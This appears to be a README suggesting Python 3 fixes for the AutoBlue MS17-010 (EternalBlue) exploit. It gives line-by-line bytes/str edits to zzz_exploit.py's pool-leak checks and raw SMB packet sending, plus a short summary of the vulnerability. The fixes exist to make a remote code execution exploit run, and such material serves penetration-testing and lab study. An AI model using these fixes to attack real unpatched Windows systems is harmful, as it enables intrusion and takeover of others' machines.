# AutoBlue MS17-010 Python 3 Fix

This repo provides suggestions to fix the Python 3 version of the AutoBlue-MS17-010 Exploit Code, specifically addressing the issue related to the interaction of variables with `bytes` and `str` types in the Python scripts `mysmb.py` and `zzz_exploit.py`.

The original repository containing all the exploit files can be accessed at: https://github.com/3ndG4me/AutoBlue-MS17-010

MS17-010 is a security vulnerability in Microsoft Windows operating systems that was discovered in March 2017. The exploit allows an attacker to remotely execute code on a target system by sending specially crafted packets to the Windows Server Message Block (SMB) protocol. This vulnerability was famously exploited by the WannaCry ransomware attack in May 2017, which affected hundreds of thousands of computers worldwide. Microsoft released a patch to fix the vulnerability shortly after it was discovered.

The suggested changes for `zzz_exploit.py`:

- At line 321:
    ```python
    (original)     if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
    (modified)     if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
    ```

- At line 325:
    ```python
    (original)     elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
    (modified)     elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
    ```

- At line 328:
    ```python
    (original)     info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
    (modified)     info['FRAG_POOL_SIZE'] = leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ] * X64_INFO['POOL_ALIGN']
    ```

- At line 399:
    ```python
    (original)     conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
    (modified)     conn.send_raw(req1[-8:] + req2 + req3 + b''.join(reqs))
    ```

- At line 418:
    ```python
    (original)     if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
    (modified)     if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != b'Frag':
    ```

- At line 429:
    ```python
    (original)     if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
    (modified)     if leakData[0x4:0x8] != b'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
    ```
